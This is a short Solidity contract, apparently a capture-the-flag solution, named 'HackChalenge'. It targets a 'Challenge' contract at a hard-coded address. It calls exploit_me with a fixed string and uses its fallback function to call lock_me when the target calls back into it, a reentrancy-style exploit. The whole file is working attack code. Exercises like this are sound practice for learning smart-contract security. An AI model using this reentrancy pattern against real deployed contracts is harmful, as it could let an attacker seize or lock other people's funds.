// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import "./Challenge.sol";

contract HackChalenge {
    Challenge c = Challenge(0xC15082ecF9122c607b053b00a36B8C497564F2A3);

    function testExploit() external {
        c.exploit_me("W3BCXSECONDTIME");
    }

    fallback() external payable {
        c.lock_me();
    }
}
